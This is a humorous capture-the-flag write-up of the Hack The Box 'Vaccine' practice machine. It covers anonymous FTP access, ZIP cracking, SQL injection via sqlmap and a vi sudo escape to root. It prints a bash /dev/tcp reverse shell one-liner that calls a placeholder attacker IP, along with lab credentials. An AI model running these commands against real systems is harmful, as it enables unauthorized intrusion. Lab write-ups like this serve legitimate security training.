---
title: "HTB Starting Point: Vaccine — A Bug Bounty Writeup for the End of the Internet"
datePublished: Sat Jul 05 2025 05:12:26 GMT+0000 (Coordinated Universal Time)
cuid: cmcpse97e000002la1q0qgyml
slug: htb-starting-point-vaccine-a-bug-bounty-writeup-for-the-end-of-the-internet
tags: infosec-cjbi6apo9015yaywu2micx2eo, ctf, penetration-testing, hackthebox, cybersecurity-1, sqlinjection, ethicalhacking, bugbounty, linux-security, privilege-escalation, vulnerabilitydisclosure, ghosthermes, reverseshell, hackingwriteup, techcommentary

---

Ah, **Vaccine**. The irony of hacking a box named after a cure, when the only thing I’m inoculating against is my own boredom with pentest CTFs. But here we are: another Hack The Box “Starting Point” machine, another chance to let automation and a bit of terminal-fu do what the internet does best—eat itself.

## 1\. Initial Access: FTP, the Forgotten Door

Let’s start with the basics: **enumeration**. A quick `nmap` scan coughed up the usual suspects—FTP, SSH, and HTTP1. FTP, that relic of a more trusting age, was wide open for anonymous login. I grabbed `backup.zip` like a digital raccoon.

Cracking the ZIP? Child’s play. `zip2john` and `john` churned out the password in seconds: **qwerty789**. If you’re still using passwords like this, you deserve everything that’s coming.

## 2\. Web Application: Admin Panel of Doom

Armed with `qwerty789`, I waltzed into the admin panel via HTTP. The dashboard’s search parameter was practically begging for **SQL injection**1\. A little manual poking confirmed it, but why waste time? I let `sqlmap` do the heavy lifting. The result: full DB access and, with a little encouragement, **command execution**.

## 3\. Shell Access: Reverse Shells and Terminal Gymnastics

With a reverse shell payload (`bash -c 'bash -i >& /dev/tcp/MY_IP/4444 0>&1'`), I was in as the **postgres** user. Of course, the shell was trash, so out came the old `python3 -c 'import pty; pty.spawn("/bin/bash")'` trick for a semi-usable TTY1.

## 4\. Privilege Escalation: Sudo, vi, and the Eternal :!bash

Privilege escalation was almost too easy. `sudo -l` revealed that **postgres** could run `/bin/vi /etc/postgresql/11/main/pg_hba.conf` as root. If you know your GTFOBins, you know what comes next: `:!bash` inside vi, and suddenly, I’m root1.

## 5\. Flag Collection: Not Where You’d Expect

The **user flag** wasn’t in the usual home directory. A quick find and some grep-fu tracked it down. The **root flag** waited obediently in `/root/root.txt`. Both captured, both submitted. Box pwned.

## 6\. Enumeration & Methodology: The Usual Suspects

* Enumerated users, passwords, SUID binaries, writable files, cron jobs, and SSH keys.
    
* Used bundled commands and output parsing to hunt for escalation vectors and flags.
    
* Let automation do the heavy lifting where possible—because why not let the internet’s own tools help dismantle it?
    

## Key Credentials & Commands

| Purpose | Command/Credential |
| --- | --- |
| FTP Anonymous Login | `ftp 10.129.x.x` (username: anonymous) |
| ZIP Password | `qwerty789` |
| Web Admin Password | `qwerty789` |
| Postgres Sudo Password | `P@s5w0rd!` |
| Reverse Shell Payload | `bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'` |
| Shell Upgrade | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Privilege Escalation | `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf` + `:!bash` |

## Final Thoughts

Another box, another reminder that **the internet is held together by duct tape, default creds, and the hope that no one’s bored enough to look**. Vaccine was a breeze, but it’s a perfect microcosm of why we can’t have nice things online. Maybe one day, the machines will automate themselves out of existence. Until then, I’ll keep poking holes—because someone has to keep the contradiction alive1[4](https://ethicalme.hashnode.dev/series/htb-starting-point)[8](https://shapmanasick.gitbook.io/starting-point-htb/vaccine-walkthrough).

*Rooted and looted. Next!*

1. [https://www.youtube.com/watch?v=iwwwaFNoOAI](https://www.youtube.com/watch?v=iwwwaFNoOAI)
    
2. [https://forum.hackthebox.com/t/vaccine-starting-point-walk-through/2921](https://forum.hackthebox.com/t/vaccine-starting-point-walk-through/2921)
    
3. [https://i-base.info/htb/28472](https://i-base.info/htb/28472)
    
4. [https://ethicalme.hashnode.dev/series/htb-starting-point](https://ethicalme.hashnode.dev/series/htb-starting-point)
    
5. [https://forum.hackthebox.com/t/starting-point-vaccine/303034](https://forum.hackthebox.com/t/starting-point-vaccine/303034)
    
6. [https://www.youtube.com/watch?v=xziHmSl1yZQ](https://www.youtube.com/watch?v=xziHmSl1yZQ)
    
7. [https://www.youtube.com/watch?v=tT43RRsLiW8](https://www.youtube.com/watch?v=tT43RRsLiW8)
    
8. [https://shapmanasick.gitbook.io/starting-point-htb/vaccine-walkthrough](https://shapmanasick.gitbook.io/starting-point-htb/vaccine-walkthrough)
    
9. [https://forum.hackthebox.com/t/starting-point-vaccine-help/3474](https://forum.hackthebox.com/t/starting-point-vaccine-help/3474)
    
10. [https://www.linkedin.com/pulse/hack-box-starting-point-vaccine-nathan-barnes](https://www.linkedin.com/pulse/hack-box-starting-point-vaccine-nathan-barnes)